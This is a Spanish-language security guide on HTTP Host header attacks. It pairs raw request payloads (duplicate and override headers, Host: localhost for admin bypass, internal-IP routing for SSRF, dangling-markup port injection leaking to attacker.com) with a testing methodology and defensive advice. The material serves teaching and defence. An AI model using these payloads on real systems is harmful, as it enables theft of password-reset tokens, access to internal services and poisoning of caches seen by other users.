# HTTP Host header attacks

## 🌐 ¿Qué son los ataques HTTP Host Header?

Los ataques de **HTTP Host Header** explotan aplicaciones web que manejan el valor de la cabecera `Host` de forma insegura.

La cabecera `Host` existe porque múltiples sitios web pueden compartir una misma dirección IP (hosting virtual), y el servidor necesita saber a qué sitio quieres acceder.

El problema surge cuando los desarrolladores utilizan este valor dentro de la lógica del servidor sin validarlo, por ejemplo para:

* Generar enlaces de restablecimiento de contraseña
* Enrutar solicitudes
* Controlar accesos

En estos casos, un atacante puede manipular la cabecera para alterar el comportamiento de la aplicación.

###  Impacto

* Robo de tokens de restablecimiento de contraseña
* Bypass de autenticación (acceso a paneles de administración)
* Envenenamiento de caché web (servir contenido malicioso)
* SSRF hacia infraestructura interna
* Exfiltración de datos mediante dangling markup

***

## ⚙️ Cómo funcionan estos ataques

La idea principal es que la cabecera `Host` es controlada por el usuario, pero muchos desarrolladores no la tratan como una entrada no confiable.

```http
GET /forgot-password HTTP/1.1
Host: attacker.com
```

Ejemplo de lo que ocurre:

```html
<!-- El servidor usa Host para generar el enlace -->
<!-- Resultado: https://attacker.com/reset?token=secret -->
<!-- La víctima hace clic y el token llega al atacante -->
```

***

## 💉 Técnicas de inyección

###  Reemplazo directo

```http
GET / HTTP/1.1
Host: attacker.com
```

###  Cabeceras Host duplicadas

```http
GET / HTTP/1.1
Host: victim.com
Host: attacker.com
```

###  URL absoluta con Host diferente

```http
GET https://victim.com/ HTTP/1.1
Host: attacker.com
```

###  Inyección en el puerto

```http
GET / HTTP/1.1
Host: victim.com:evil-payload-here
```

###  Cabeceras de override

```http
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker.com
```

###  Line wrapping

```http
GET / HTTP/1.1
Host: attacker.com
Host: victim.com
```

***

## 🎯 Tipos de ataques

###  Password Reset Poisoning

1. Se solicita un reset de contraseña para la víctima
2. Se inyecta un dominio controlado por el atacante en `Host`
3. El enlace generado apunta al servidor del atacante
4. La víctima hace clic y el token es robado

###  Bypass de autenticación

```http
GET /admin HTTP/1.1
Host: localhost
```

El servidor puede interpretar la petición como interna y conceder acceso.

###  SSRF basado en routing

```http
GET / HTTP/1.1
Host: 192.168.0.1
```

* El balanceador enruta la petición a una IP interna
* Se accede a servicios internos

###  Web Cache Poisoning

```http
GET / HTTP/1.1
Host: victim.com
Host: attacker.com
```

* La respuesta incluye contenido controlado por el atacante
* Se almacena en caché
* Otros usuarios reciben contenido malicioso

###  Ataque de estado de conexión

* Primera petición: `Host: victim.com` pasa validación
* Segunda petición: `Host: 192.168.0.1` reutiliza la conexión y evita validaciones

###  Dangling Markup (inyección en puerto)

```http
Host: victim.com:'<a href="//attacker.com/?
```

* Se genera una etiqueta HTML sin cerrar
* Captura contenido posterior
* Puede incluir datos sensibles como tokens o contraseñas

***

## 🧪 Metodología de testeo

1. Modificar la cabecera `Host` y comprobar si el servidor responde
2. Si hay bloqueo, probar con `X-Forwarded-Host`
3. Si sigue bloqueando, probar:
   * Cabeceras duplicadas
   * URL absoluta
   * Line wrapping
4. Si el valor se refleja, analizar dónde:
   * Emails
   * HTML
   * Redirecciones
   * Scripts
5. Si cambia el routing, probar SSRF con rangos internos
6. Si hay reutilización de conexión, probar ataques de estado de conexión

***

## 🛡️ Buenas prácticas de defensa

###  Evitar usar Host en la lógica

* Usar configuración interna para dominios
* Preferir URLs relativas

###  Validar la cabecera Host

```python
ALLOWED_HOSTS = ['www.example.com']

if request.headers.get('Host') not in ALLOWED_HOSTS:
    abort(403)
```

###  Deshabilitar cabeceras de override

* No permitir `X-Forwarded-Host` ni `X-Host`
* Desactivar soporte por defecto si no es necesario

###  Proteger servicios internos

* No alojar aplicaciones internas en el mismo servidor público
* Configurar balanceadores para aceptar solo dominios permitidos
